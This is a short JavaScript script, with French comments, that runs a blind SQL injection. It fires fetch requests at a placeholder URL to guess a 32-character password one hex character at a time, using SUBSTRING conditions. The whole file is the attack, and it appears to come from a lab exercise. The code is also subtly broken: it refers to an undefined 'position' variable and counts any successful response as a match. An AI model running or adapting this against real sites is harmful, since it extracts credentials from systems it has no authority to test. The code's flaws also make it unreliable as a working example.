let lettersPwd = [];

function injection(){
     let i = 'abcdef0123456789'; //on defini ici la chaine de caracteres
     i.split('').forEach((letter)=> {
        for(i=1; i<=32;i++) testLetter(letter, i);});
}; //ici on parcours donc cette chaine de caracteres, on passe 32 fois a chaque position(i).
function testLetter (letter, i){
    let func = ("SUBSTRING(password" .concat(',',i,',1 ) = ', letter));
    fetch(`Votre lien${encodeURI(func)}&Submit=Submit#`).then((response) =>{
        if (response.ok) lettersPwd[position-1] = letter;  // On récupère la lettre dans l'array
        if(lettersPwd.join('').length == 32) console.info(`Le mot de passe est :  ${lettersPwd.join('')}`);
    });
}

injection();

